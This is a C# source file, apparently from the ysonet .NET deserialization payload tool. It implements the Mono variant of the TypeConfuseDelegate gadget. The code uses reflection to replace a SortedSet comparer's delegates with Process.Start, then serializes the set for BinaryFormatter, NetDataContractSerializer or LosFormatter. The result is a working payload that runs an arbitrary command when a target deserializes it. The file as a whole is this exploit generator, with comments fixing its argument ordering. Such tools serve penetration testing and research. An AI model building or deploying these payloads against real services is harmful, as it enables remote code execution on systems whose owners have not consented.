using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class TypeConfuseDelegateMonoGenerator : GenericGenerator
    {
        public override bool SupportsLegacyFx()
        {
            return false;
        }

        // Discovery facets (category search only): same code-execution mechanism as
        // TypeConfuseDelegate, Mono-compatible (mscorlib/System, built-in). The
        // whole point of this variant is the Mono field layout, so Mono is the
        // runtime it is recorded on.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                .WithVersions(RuntimeVersion.Mono);
        }

        public override string AdditionalInfo()
        {
            return "Tweaked TypeConfuseDelegate gadget to work with Mono; --legacyfx is "
                + "not supported because that option targets .NET Framework CLR2.";
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Denis Andzakovic, Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            return Serialize(TypeConfuseDelegateGadget(inputArgs), formatter, inputArgs);
        }

        /* this can be used easily by the plugins as well */

        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
        public static object TypeConfuseDelegateGadget(string cmd)
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = cmd;
            return TypeConfuseDelegateGadget(inputArgs);
        }

        public static object TypeConfuseDelegateGadget(InputArgs inputArgs)
        {
            string cmdFromFile = inputArgs.CmdFromFile;

            if (!string.IsNullOrEmpty(cmdFromFile))
            {
                inputArgs.Cmd = cmdFromFile;
            }

            string executable = inputArgs.CmdFileName;
            // Process.Start takes two arguments, so the set always holds two elements.
            string arguments = inputArgs.HasArguments ? inputArgs.CmdArguments : "";

            Comparison<string> benign = new Comparison<string>(String.Compare);
            // Slot 0 is the benign comparison; slot 1 only orders the set while it is filled
            // here, and both slots are replaced below before anything is serialized.
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(
                benign, FillOrderPuttingTheExecutableLast(benign, executable));
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(executable);
            set.Add(arguments);

            // MulticastDelegate stores its invocation list under different private
            // field names per runtime: Mono calls it "delegates", .NET Framework calls
            // it "_invocationList". ysonet runs on .NET Framework, so look up the Mono
            // name first (for when the tool is run on Mono) and fall back to the .NET
            // Framework name. Using only "delegates" returned null on .NET Framework and
            // made every generation of this gadget throw a NullReferenceException.
            FieldInfo fi = typeof(MulticastDelegate).GetField("delegates", BindingFlags.NonPublic | BindingFlags.Instance)
                        ?? typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[0] = new Func<string, string, Process>(Process.Start);
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }

        // The set serializes its two elements smallest first, and on deserialize the target
        // compares the SECOND one against the first - which is what makes that second element
        // Process.Start's file name. Left to the strings themselves the order is luck: the
        // default -c path wraps the command as "cmd" and "/c ...", which always sorts the
        // right way round, but --rawcmd removes that wrapper and a command like
        // "notepad.exe zzz.txt" sorts the executable BELOW its argument, which used to build
        // Process.Start("zzz.txt", "notepad.exe").
        //
        // A multicast Comparison returns the result of the LAST method in its invocation list,
        // which is slot 1 - and both slots are replaced with Process.Start before the set is
        // serialized. So an ordering placed there decides the serialized order and never
        // reaches the wire; the bytes are unchanged for every command that already sorted the
        // right way round. Equality still comes from the benign comparison, so equal strings
        // still collapse the set to one element exactly as before.
        private static Comparison<string> FillOrderPuttingTheExecutableLast(
            Comparison<string> benign, string executable)
        {
            return delegate(string x, string y)
            {
                if (benign(x, y) == 0)
                    return 0;
                return String.Equals(x, executable, StringComparison.Ordinal) ? 1 : -1;
            };
        }
    }
}
